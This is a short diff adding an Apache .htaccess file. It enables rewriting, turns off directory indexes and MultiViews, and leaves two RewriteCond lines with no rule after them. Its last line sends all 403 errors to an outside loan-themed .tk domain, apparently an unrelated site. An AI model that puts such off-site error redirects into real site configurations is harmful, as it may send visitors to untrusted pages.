@@ -1,0 +1,10 @@
+RewriteEngine On
+RewriteBase /
+
+Options -Indexes
+Options -Multiviews
+
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+ErrorDocument 403 http://www.loankart.tk
